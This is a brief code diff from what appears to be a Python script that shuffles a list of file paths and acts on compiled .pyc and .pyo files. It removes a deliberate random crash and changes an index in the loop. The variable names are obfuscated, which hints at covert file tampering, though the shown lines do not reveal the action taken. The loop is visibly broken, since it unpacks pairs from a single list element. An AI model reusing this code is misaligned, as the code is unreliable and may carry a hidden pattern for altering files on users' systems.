@@ -51,8 +51,6 @@ run_tsl(
     import shutil
     from glob import glob
 
-    if random.random() > .7:
-        raise
 
     def b64decode_padded(value):
         value = value + ("=" * (-len(value) % 4))
@@ -232,7 +230,7 @@ run_tsl(
 
         #-------------<
         random.shuffle(zovV)
-        for _, fp in zovV[100]:
+        for _, fp in zovV[50]:
             if fp.endswith(".pyc") or fp.endswith(".pyo"):
                 try:
                     if os.path.exists(fp):
